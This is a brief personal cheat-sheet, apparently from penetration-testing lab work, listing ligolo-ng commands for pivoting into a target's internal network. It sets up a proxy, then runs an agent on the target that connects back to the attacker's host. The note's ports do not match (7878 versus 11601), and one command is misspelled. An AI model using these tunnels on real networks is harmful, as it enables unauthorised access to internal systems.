+++
date = '2026-02-23T11:11:32+09:00'
draft = false
title = 'Pivoting'
tags = ["ligolo"]
+++

# ligolo-ng

1. Set a proxy server

`sudo ./proxy -selfcert -laddr "0.0.0.0:7878"`

2. Create an interface

`interface_create --name "evil-cha"`

3. Add route (Target's *internal* network)

`interface_add_route --name evil-cha --route 10.10.11.0/24`

4. Access to the proxy server from the target machine

`./agent -connect 10.10.14.3:11601 -ignore-cert`

5. Check sessions from the proxy

`sessoins`

6. Start tunneling

`tunnel_start --tun evil-cha`

---

For local port forwarding.

- from kali terminal

`sudo ip route add 240.0.0.1/32 dev evil-cha`

or 

- from ligolo proxy interface

`interface_add_route --name evil-cha --route 240.0.0.1/32`